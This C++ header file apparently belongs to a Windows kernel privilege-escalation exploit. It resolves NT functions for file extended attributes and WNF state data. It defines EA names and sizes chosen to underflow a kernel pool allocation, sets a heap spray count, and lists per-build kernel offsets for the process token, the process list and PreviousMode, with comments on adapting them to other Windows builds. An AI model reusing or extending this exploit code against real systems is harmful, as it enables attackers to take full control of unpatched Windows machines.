#pragma once


#include <iostream>
#include <Windows.h>
#include <sddl.h>
#include <intrin.h>
#include <iomanip>
#include "Header.h"
#include "Ulog.h"



#define Ulog( format, ... ) LogTrace(std::source_location::current(), format, ##__VA_ARGS__ )


#define STATUS_UNSUCCESSFUL              ((NTSTATUS)0xC0000001L)


// Globals

inline __ZwQueryEaFile NtQueryEaFile = NULL;
inline __ZwSetEaFile  NtSetEaFile = NULL;
inline __NtCreateWnfStateName NtCreateWnfStateName = NULL;
inline __NtUpdateWnfStateData NtUpdateWnfStateData = NULL;
inline __NtQueryWnfStateData NtQueryWnfStateData = NULL;
inline __NtDeleteWnfStateData NtDeleteWnfStateData = NULL;
inline __NtDeleteWnfStateName NtDeleteWnfStateName = NULL;
inline __NtQuerySystemInformation NtQuerySystemInformation = NULL;
inline __NtReadVirtualMemory NtReadVirtualMemory = NULL;
inline __NtWriteVirtualMemory NtWriteVirtualMemory = NULL;

#define TRIGGER_EA_NAME			   (".FS")
#define TRIGGER_EA_NAME_LENGTH     (UCHAR)(strlen(TRIGGER_EA_NAME))

#define OVERFLOW_EA_NAME		   (".FSX")
#define OVERFLOW_EA_NAME_LENGTH    (UCHAR)(strlen(OVERFLOW_EA_NAME))
#define OVERFLOW_EA_VALUE_LENGTH   (0xf)
#define OVERFLOWN_STATEDATA_LENGTH (0x1000)

// I think this is how much we want to the pool to allocate, we will use this macro to Query as the outbuffer_size so that we will underflow
#define KERNEL_ALLOC_SIZE		   (0xae)
#define FIRST_RAW_SIZE			   (KERNEL_ALLOC_SIZE - 1)
#define TRIGGER_EA_VALUE_LENGTH    (FIRST_RAW_SIZE - TRIGGER_EA_NAME_LENGTH - 9)
#define SPRAY_COUNT				   (20000)
#define STATE_NAME_MASK			   (0x41C64E6DA3BC0074i64)


// Offsets - Change these if you need to exploit on a different build that have different offsets
// https://www.vergiliusproject.com/kernels/x64/Windows%2011/22H2%20(2022%20Update)/_KPROCESS
// https://www.vergiliusproject.com/kernels/x64/Windows%2011/22H2%20(2022%20Update)/_KTHREAD

#define TOKEN_OFFSET				0x4b8 // This changed a few times. Windows 10 | 2016 2004 20H1 (May 2020 Update) x64 and so on is correct, before that it is 0x360 and then 0x358.. etc
#define UNIQUE_PROCESS_ID_OFFSET	0x440 // This changed a few times. Windows 10 | 2016 2004 20H1 (May 2020 Update) x64 and so on is correct, before that it is not..
#define ACTIVE_PROCESS_LINKS_OFFSET 0x448 // This changed a few times. Windows 10 | 2016 2004 20H1 (May 2020 Update) x64 and so on is correct, before that it is not..
#define THREAD_LIST_ENTRY_OFFSET	0x2f8 // Havent changed since W7
#define THREAD_LIST_HEAD_OFFSET		0x30  // Havent changed since W7
#define PREVIOUS_MODE_OFFSET		0x232 // Havent changed since W8


